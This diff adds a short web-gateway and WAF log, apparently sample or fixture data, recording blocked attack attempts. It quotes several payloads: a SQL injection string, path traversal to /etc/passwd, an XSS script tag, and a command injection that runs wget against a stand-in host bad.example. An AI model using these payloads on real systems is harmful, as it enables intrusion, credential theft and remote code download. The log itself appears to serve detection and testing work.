@@ -1,0 +1,8 @@
+2026-03-02T10:01:03 INFO web-gw: 10.20.7.31 "GET /health HTTP/1.1" 200 ua="k8s-probe/1.29"
+2026-03-02T10:04:17 WARNING web-gw: 203.0.113.77 "GET /app/search?q=' OR '1'='1 HTTP/1.1" 403 ua="Mozilla/5.0"
+2026-03-02T10:04:52 ERROR waf: SQL injection pattern matched: union select password from users src=203.0.113.77
+2026-03-02T10:05:18 WARNING web-gw: 203.0.113.77 "GET /assets/../../etc/passwd HTTP/1.1" 400 ua="curl/8.8.0"
+2026-03-02T10:06:07 ALERT waf: XSS attempt blocked pattern=<script>alert('x')</script> src=198.51.100.24
+2026-03-02T10:07:42 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=198.51.100.24
+2026-03-02T10:08:13 INFO web-gw: 10.20.7.44 "POST /api/v1/session HTTP/1.1" 201 ua="SentinelClient/2.1"
+2026-03-02T10:09:01 NOTICE app: suspicious requests auto-quarantined source_ips=203.0.113.77,198.51.100.24
